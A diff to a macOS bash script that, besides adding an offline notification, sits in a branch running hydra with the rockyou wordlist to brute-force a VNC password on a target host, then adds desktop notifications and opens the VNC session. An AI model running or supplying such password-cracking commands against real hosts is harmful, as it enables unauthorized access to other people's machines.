@@ -83,9 +83,15 @@ else
             
             # Else, it notifies them that they are not connected to the internet and tells them to connect
             else
-                # Error message if offline
+                # Error message if offline notification
+                offlineTitle="Offline"
+                offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
+                osascript -e "display notification \"$offline\" with title \"$offlineTitle\""
+                
+                #offline text in the terminal
                 echo "ERROR:root:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
                 echo "TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
+                exit 1
             fi
 
             # clear the terminal
@@ -162,6 +168,19 @@ else
                     else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
+                        #alerts the user that the computer is trying to connect to the VNC server
+                        title="Connecting to ${user}"
+                        Connecting_To_VNC_SERVER="We are connecting you to ${user} plase wait..."
+                        osascript -e "display notification \"$Connecting_To_VNC_SERVER\" with title \"$title\""
+                        
+                        sleep 5
+
+                        # it connects to the ssh server and asks for the user to input a password to connect to the ssh server
+                        #notifcation for the user to see the computer is connected to the VNC server
+                        title="Enter password to ${user}"
+                        Connected_To_VNC_SERVER="We have conncted you to ${user} Plase enter the password to ${user} to continue..."
+                        osascript -e "display notification \"$Connected_To_VNC_SERVER\" with title \"$title\""
+                        # put the 
                         echo "Loading VNC server..."
                         open vnc://$host
                         exit
